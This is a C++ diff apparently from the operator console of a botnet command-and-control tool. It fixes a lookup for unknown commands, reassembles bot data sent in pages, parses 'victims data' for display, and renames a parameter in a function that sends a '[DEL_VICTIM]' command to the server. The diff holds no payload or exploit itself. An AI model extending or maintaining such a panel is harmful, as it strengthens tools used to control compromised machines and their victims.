@@ -50,8 +50,10 @@ void manager::handleResponse(std::string& query, session* manager) {
 	if (parsed_msg["is_valid_msg"][0] == "false") {
 		return;
 	}
-	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
-	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], manager);
+	if (command_handlers_.find(parsed_msg["command"][0]) != command_handlers_.end()) {
+		auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
+		if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], manager);
+	}
 }
 
 void manager::handleAlive(std::string& command, std::vector<std::string>& params, session* server) {
@@ -68,13 +70,38 @@ void manager::handleInit(std::string& command, std::vector<std::string>& params,
 
 void manager::handleGetBotsData(std::string& command, std::vector<std::string>& params, session* server) {
 	if (!params.size()) return;
-	interactive_.updateMainWindowMenu(params);
-	interactive_.active_tab_ = command;
-}
 
+	if (stoi(params[0]) == 1) {
+		// 3 , [3] + 5
+		bots_data_container_ = std::move(std::vector<std::string>());
+		for (int i = 2; i < 8; ++i) {
+			bots_data_container_.push_back(params[i]);
+		}
+	}
+
+	// [3 + 5] + 1
+	for (int i = 8; i < params.size(); ++i) {
+		bots_data_container_.push_back(params[i]);
+	}
+
+	if (stoi(params[0]) == stoi(params[1])) {
+		interactive_.updateMainWindowMenu(bots_data_container_);
+		interactive_.active_tab_ = command;
+		return;
+	}
+
+	std::vector<std::string> output_params{passphrase_, "1"};
+	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
+}
 void manager::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* server) {
 	if (!params.size()) return;
-	interactive_.updateMainWindowMenu(params);
+
+    std::vector<std::string> victims_data;
+    for (int i = 2; i < params.size(); ++i){
+        victims_data.push_back(params[i]);
+    }
+
+	interactive_.updateMainWindowMenu(victims_data);
 	interactive_.active_tab_ = command;
 }
 
@@ -96,8 +123,8 @@ void manager::removeClient(std::string& bot_ip) {
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
 
-void manager::removeVictim(std::string& bot_ip) {
-	std::vector<std::string> output_params = {passphrase_, bot_ip};
+void manager::removeVictim(std::string& victim_ip) {
+	std::vector<std::string> output_params = {passphrase_, victim_ip};
 	std::string command = "[DEL_VICTIM]";
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
